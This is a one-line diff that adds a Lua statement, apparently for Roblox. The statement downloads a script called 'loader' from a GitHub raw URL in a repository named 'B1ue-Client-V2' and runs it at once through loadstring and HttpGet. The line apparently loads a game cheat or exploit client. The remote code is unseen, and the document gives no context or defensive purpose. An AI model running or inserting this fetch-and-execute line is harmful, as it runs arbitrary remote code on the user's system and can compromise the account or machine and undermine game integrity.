@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mrmodderman/B1ue-Client-V2/refs/heads/main/loader"))()
